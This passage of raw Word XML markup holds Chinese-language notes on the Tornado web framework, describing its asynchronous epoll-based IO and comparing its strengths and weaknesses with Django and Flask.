        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="534576E0" w14:textId="632F73AA"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3</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Tornado</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>采用的单进程单线程异步</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>IO</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的网络模式，其高性能源于</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Tornado</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>基于</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Linux</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Epoll</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>UNIX</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>为</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>kqueue</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）的异步网络</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>IO</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AEE586D" w14:textId="41929558"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4</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出色的抗负载能力</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14C31A67" w14:textId="2F782258"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5</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不依赖多进程或多线程</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD89BDD" w14:textId="2ECA477C"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6</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WSGI</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>全栈替代产品</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FE03AD6" w14:textId="3DA48280"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7</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WSGI</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>把应用（</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Application</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）和服务器（</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Server</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）结合起来，</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Tornado</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>既可以是</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>应用也可以是</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383DFD82" w14:textId="21253EC2"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8</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既是</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WebServer</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>也是</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WebFramework</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D332EEE" w14:textId="6DA2323B" w:rsidR="006B2B80" w:rsidRPr="003A0200" w:rsidRDefault="00673A92"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004</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Tornado</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>区别</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25385986" w14:textId="77777777" w:rsidR="00673A92"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 Django| Tornado ---|---|--- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>优点</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大和全（重量级框架）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少而精（轻量级框架）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71537268" w14:textId="57610CB5" w:rsidR="00673A92"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>自带</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template</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view |</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>注重性能优越，速度快</w:t>
      </w:r>
      <w:r w:rsidR="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08619E73" w14:textId="1F22FD92" w:rsidR="00673A92"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>需要的功能也可以去找第三方的</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异步非阻塞，解决高并发</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（请求处理是基于回调的非阻塞调用）</w:t>
      </w:r>
      <w:r w:rsidR="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27AF0F3C" w14:textId="77777777" w:rsidR="00673A92"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>注重高效开发</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内嵌了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>服务器，合适</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>websockets</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和长连接</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="259343FA" w14:textId="46CF0909" w:rsidR="00673A92"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>全自动化的管理后台</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（只需要使用起</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，做简单的定义，</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就能自动生成数据库结构，全功能的管理后台）</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单线程的异步网络程序，</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默认启动时根据</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CPU</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>数量运行多个实例；</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利用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CPU</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>多核的优势</w:t>
      </w:r>
      <w:r w:rsidR="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32976303" w14:textId="4349473C" w:rsidR="00673A92"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 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>缺点</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> |template</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>不怎么好用（来自自身的缺点）</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模板和数据库部分有很多第三方的模块可供选择，这样不利于封装为一个功能模块</w:t>
      </w:r>
      <w:r w:rsidR="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9C3DF8" w14:textId="0F9A6EC0"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数据库用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nosql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>不方便（来自自身的缺点）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>| ||</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>如果功能不多，容易臃肿</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5802474E" w14:textId="77777777"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总结</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A76710C" w14:textId="38F7ED99"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1</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要性能，</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Tornado </w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>首选；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CDBC0E9" w14:textId="5F791332"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2</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要开发速度，</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Django </w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Flask </w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>都行，区别是</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Flask </w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>把许多功能交给第三方库去完成了，因此</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
